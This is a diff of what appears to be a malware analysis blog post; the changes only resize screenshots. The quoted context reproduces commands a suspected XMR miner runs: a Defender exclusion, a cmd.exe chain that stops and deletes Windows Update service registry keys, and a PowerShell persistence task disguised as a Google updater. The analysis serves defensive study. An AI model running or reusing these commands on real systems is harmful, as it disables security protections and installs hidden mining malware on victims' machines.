@@ -188,13 +188,13 @@ After executing the binary and letting its execution flow freely, I started to s
 
 ```powershell.exe Add-MpPreference -ExclusionPath @($env:UserProfile, $env:ProgramFiles) -Force```
 
-<img src="/images/1powerexclude.png" alt= "exclusion" width="85%" height="85%">
+<img src="/images/1powerexclude.png" alt= "exclusion" width="95%" height="95%">
 
 After that, it used cmd.exe to stop some services and use the ```reg delete``` command to delete some entries in the Registry with the following command:
 
 ```cmd.exe /c sc stop UsoSvc & sc stop WaaSMedicSvc & sc stop wuauserv & sc stop bits & sc stop dosvc & reg delete "HKLM\SYSTEM\CurrentControlSet\Services\UsoSvc" /f & reg delete "HKLM\SYSTEM\CurrentControlSet\Services\WaaSMedicSvc" /f & reg delete "HKLM\SYSTEM\CurrentControlSet\Services\wuauserv" /f & reg delete "HKLM\SYSTEM\CurrentControlSet\Services\bits" /f & reg delete "HKLM\SYSTEM\CurrentControlSet\Services\dosvc" /f```
 
-<img src="/images/2cmdstopservice.png" alt= "cmdstopservice" width="85%" height="85%">
+<img src="/images/2cmdstopservice.png" alt= "cmdstopservice" width="95%" height="95%">
 
 The binary stops & deletes the registry entries for the following services:
 1. **```UsoSvc```**
@@ -216,11 +216,11 @@ Next up, the binary copies itself & adds itself to startup with Administrator pr
 
 ```powershell.exe <#xjwvbygm#> IF((New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) { IF([System.Environment]::OSVersion.Version -lt [System.Version]"6.2") { schtasks /create /f /sc onlogon /rl highest /ru 'System' /tn 'GoogleUpdateTaskMachineQC' /tr '''C:\Program Files\Google\Chrome\updater.exe''' } Else { Register-ScheduledTask -Action (New-ScheduledTaskAction -Execute 'C:\Program Files\Google\Chrome\updater.exe')  -Trigger (New-ScheduledTaskTrigger -AtStartup)  -Settings (New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DisallowHardTerminate -DontStopIfGoingOnBatteries -DontStopOnIdleEnd -ExecutionTimeLimit (New-TimeSpan -Days 1000))  -TaskName 'GoogleUpdateTaskMachineQC' -User 'System' -RunLevel 'Highest' -Force; } } Else { reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "GoogleUpdateTaskMachineQC"/t REG_SZ /f /d 'C:\Program Files\Google\Chrome\updater.exe' }, ```
 
-<img src="/images/3powerupdater.png" alt= "3powerupdater" width="80%" height="80%">
+<img src="/images/3powerupdater.png" alt= "3powerupdater" width="95%" height="95%">
 
 Finally, just in case the second cmd.exe command didn't work, cmd.exe runs all the commands again, but this time, one-by-one.
 
-<img src="/images/4cmdstopservice2.png" alt= "4cmdstopservice" width="75%" height="75%">
+<img src="/images/4cmdstopservice2.png" alt= "4cmdstopservice" width="80%" height="80%">
 
 Again, VirusTotal says that this binary connects to ```xmr.2miners.com```, so it is a highly probable chance that this is some XMR mining malware.
 
